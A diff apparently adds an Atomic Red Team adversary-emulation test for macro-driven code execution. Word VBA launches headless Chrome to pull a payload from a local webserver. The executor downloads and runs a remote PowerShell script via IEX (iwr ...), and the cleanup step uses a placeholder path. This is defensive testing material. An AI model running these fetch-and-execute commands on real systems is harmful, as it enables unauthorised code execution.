@@ -255,3 +255,35 @@ atomic_tests:
       Remove-Item "$env:TEMP\atomic_redteam_x4m_exec.vbs" -ErrorAction Ignore
       Remove-Item "$env:TEMP\procexp.exe" -ErrorAction Ignore
     name: powershell
+- name: Headless Chrome code execution via VBA
+  auto_generated_guid: 
+  description: |
+    This module uses Google Chrome combined with ScriptControl to achieve code execution. It spawns a local
+    webserver hosting our malicious payload. Headless Google Chrome will then reach out to this webserver
+    and pull down script and execute it.
+
+    This module requires a 64 bit version of office and a 64 bit installation of Google Chrome
+  supported_platforms:
+  - windows
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      Microsoft Word must be installed
+    prereq_command: |
+      try {
+        New-Object -COMObject "Word.Application" | Out-Null
+        $process = "Word"; if ( $process -eq "Word") {$process = "winword"}
+        Stop-Process -Name $process
+        exit 0
+      } catch { exit 1 }
+    get_prereq_command: |
+      Write-Host "You will need to install Microsoft Word manually to meet this requirement"
+  executor:
+    command: |
+      function bg() {Start-Process -NoNewWindow @args}
+      bg Powershell.exe PathToAtomicsFolder\T1204.002\src\simplewebserver.ps1
+      IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")
+      Invoke-Maldoc -macroFile "PathToAtomicsFolder\T1204.002\src\chromeexec-macrocode.txt" -officeProduct "Word" -sub "ExecChrome"
+    cleanup_command: |
+      Remove-Item blah -ErrorAction Ignore
+    name: powershell
